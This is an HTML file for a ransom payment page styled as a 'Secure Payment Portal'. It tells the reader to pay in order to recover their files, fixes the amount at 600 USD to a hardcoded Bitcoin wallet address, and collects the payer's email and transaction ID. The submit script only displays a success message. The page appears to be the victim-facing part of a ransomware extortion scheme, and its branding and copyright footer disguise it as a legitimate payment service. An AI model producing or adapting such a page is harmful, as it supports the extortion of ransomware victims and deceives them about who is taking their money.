<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Secure Payment Portal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: url('indexback.gif') no-repeat center center fixed;
            background-size: cover;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 400px;
            margin: 80px auto;
            background: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
        }
        h2 {
            text-align: center;
            color: #333;
        }
        p {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
        }
        input[type="text"],
        input[type="email"],
        input[type="number"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            background-color: #007bff;
            color: white;
            border: none;
            padding: 12px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
            text-align: center;
        }
        .success-message {
            display: none;
            text-align: center;
            color: green;
            font-weight: bold;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Secure Payment Portal</h2>
        <p>Please complete your payment to recover your files.</p>
        <form id="paymentForm">
            <label for="btcAddress">Bitcoin Wallet Address</label>
            <input type="text" id="btcAddress" name="btcAddress" value="12tYDPgwueZ9NyMgw5i9p7AA8isjr6SMw" readonly />

            <label for="amount">Amount (USD)</label>
            <input type="number" id="amount" name="amount" value="600" readonly />

            <label for="payerEmail">Your Email</label>
            <input type="email" id="payerEmail" name="payerEmail" placeholder="you@example.com" required />

            <label for="transactionId">Transaction ID</label>
            <input type="text" id="transactionId" name="transactionId" placeholder="Enter your transaction ID" required />

            <button type="submit">Submit Payment</button>
        </form>
        <div class="success-message" id="successMessage">Payment Successful! Thank you.</div>
        <div class="footer">
            &copy; 2024 Secure Payment Services. All rights reserved.
        </div>
    </div>
    <script>
        document.getElementById('paymentForm').addEventListener('submit', function(event) {
            event.preventDefault();
            // Simple validation could be added here if needed
            document.getElementById('successMessage').style.display = 'block';
            this.style.display = 'none';
        });
    </script>
</body>
</html>
